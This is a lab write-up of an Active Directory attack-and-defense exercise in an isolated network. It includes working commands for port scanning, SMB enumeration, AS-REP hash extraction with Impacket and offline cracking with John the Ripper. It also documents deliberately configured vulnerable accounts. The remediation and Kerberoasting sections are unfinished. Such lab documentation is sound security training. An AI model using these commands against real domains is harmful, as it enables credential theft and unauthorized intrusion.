# Lab 01: Active Directory Attack and Defense

## Project Overview
This laboratory demonstrates the identification, exploitation, and remediation of common security misconfigurations within an Active Directory environment. The project covers the full lifecycle of an infrastructure pentest, from initial environment preparation to final hardening.

## Environment Topology
The environment consists of a Windows Server 2022 Domain Controller, a Windows 11 workstation, and a Kali Linux attack node. All testing is performed within an isolated virtual network under the company.local domain.

| Hostname | Role | Operating System | IP Address |
| :--- | :--- | :--- | :--- |
| DC01 | Domain Controller | Windows Server 2022 | 192.168.0.25 |
| DC02 | Workstation | Windows 11 | 192.168.0.30 |
| kali-attacker | Penetration Testing Host | Kali Linux | 192.168.0.205 |

## Phase 1: Vulnerability Setup

To simulate a realistic insecure enterprise environment, a custom PowerShell script was developed and executed on **DC01**. This phase involved technical challenges regarding Active Directory attribute manipulation and environment stabilization.

### 1.1 Automated Configuration
The setup script (`01-Setup-Vulnerable/Set-VulnerableAD.ps1`) automates the following misconfigurations:
* **AS-REP Roasting**: Creation of the `victim.asrep` account with Kerberos Pre-Authentication disabled.
* **Kerberoasting**: Creation of the `svc_sql` service account with a registered Service Principal Name (SPN).

### 1.2 Troubleshooting & Script Evolution
During execution, several limitations were identified regarding standard PowerShell parameters for specific AD attributes. The following table documents the technical hurdles and their respective resolutions:

| Issue | Root Cause | Resolution |
| :--- | :--- | :--- |
| `New-ADUser` error | Account already existed from previous execution attempts. | Implemented logic to verify object existence before initialization. |
| Parameter Binding Failure | Version-specific cmdlet limitations prevented the use of `-DoesNotRequireKerberosPreauth`. | Transitioned to a **Bitwise Operation** directly on the `userAccountControl` attribute. |
| Attribute Persistence | Flag modification failed when bundled with account creation. | Decoupled account creation from attribute modification using the `-Replace` operator. |

### 1.3 Technical Validation (Verification)
Manual and automated verifications were performed to confirm that the environment reached the required vulnerable state before proceeding to the exploitation phase.

#### A. AS-REP Roasting Validation
The `DONT_REQ_PREAUTH` flag (bitmask `0x400000`) was verified for the `victim.asrep` user:
```powershell
Get-ADUser -Identity "victim.asrep" -Properties userAccountControl | Select-Object Name, @{Name="ASREP_Vulnerable"; Expression={if($_.userAccountControl -band 0x400000){$true}else{$false}}}
```
Result: `ASREP_Vulnerable: True`

#### B. Kerberoasting Validation
The Service Principal Name (SPN) registration was confirmed for the service account:

```PowerShell
setspn -L svc_sql
```
Result: `MSSQLSvc/sql01.company.local:1433` successfully mapped to the `svc_sql` account.

## Phase 2: Exploitation
This phase documents the step-by-step process of exploiting the pre-configured vulnerabilities to escalate privileges within the domain.

### 2.1 Enumeration
Initial reconnaissance is performed from the kali-attacker node to identify active hosts and services.

### 2.1.1 Network Reconnaissance
An initial port scan was performed to identify active services on the Domain Controller (192.168.0.25).

```bash
nmap -p 88,135,139,389,445,3268 -Pn 192.168.0.25
```
Results: 
| Port | Service | Status | Significance | 
| :--- | :--- | :--- | :--- | 
| 88 | Kerberos | Open | Required for Ticket-Granting Ticket (TGT) requests. | 
| 389 | LDAP | Open | Used for domain object enumeration. | 
| 445 | SMB | Open | Direct communication for authentication and file sharing. | 
| 3268 | Global Catalog | Open | AD forest-wide search service. |

### 2.1.2 Domain Identification
The tool `NetExec` was utilized to gather metadata from the target via the SMB protocol.

```bash
nxc smb 192.168.0.25
```
Results:

FQDN: `company.local`

Hostname: `DC01`

OS: `Windows Server 2022 Build 20348`

SMB Signing: `True` (Mandatory, preventing unauthorized relay attacks).

### 2.2 Initial Access via AS-REP Roasting
The attack targeted the `victim.asrep` account, which was previously configured with the `DONT_REQ_PREAUTH` flag. This misconfiguration allows an attacker to request a Kerberos AS-REP response without providing a password, obtaining a hash that can be cracked offline.

### 2.2.1 Hash Extraction
The `GetNPUsers` tool from the Impacket suite was used to request a Ticket-Granting Ticket (TGT) without pre-authentication. The Domain Controller returned an AS-REP response containing a portion encrypted with the user's password hash.
```bash
impacket-GetNPUsers company.local/victim.asrep -dc-ip 192.168.0.25 -no-pass
```
Output:
`$krb5asrep$23$victim.asrep@COMPANY.LOCAL:e90755652996c5c43fd1db326f51b5f3$c2f0f950d91397196... (truncated)`

### 2.2.2 Password Cracking
To recover the plain-text password, the captured hash was saved into a file named `hashes.asrep` and processed using `John the Ripper` with the `rockyou.txt` wordlist.
### Saving the hash
`echo '$krb5asrep$23$victim.asrep@COMPANY.LOCAL:e90755652996c5c43fd1db326f51b5f3$c2f0f950d91397196...[REDACTED]...2cb82d' > hashes.asrep`

### Cracking the hash
`john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asrep`

#### The recovered hash was processed offline using `John the Ripper`. After an initial broad sweep with `rockyou.txt`, a targeted wordlist attack successfully recovered the plain-text credentials.

```bash
# Executing the attack with a targeted wordlist
john --wordlist=pass.txt hashes.asrep
```
Cracking Results:

Username: `victim.asrep`

Recovered Password: `P@ssword123!`

Status: SUCCESS.

### 2.3 Privilege Escalation via Kerberoasting
(Pending documentation)

## Phase 3: Hardening and Remediation
This section will contain the security controls and PowerShell scripts required to remediate the identified vulnerabilities and monitor for similar attack patterns.
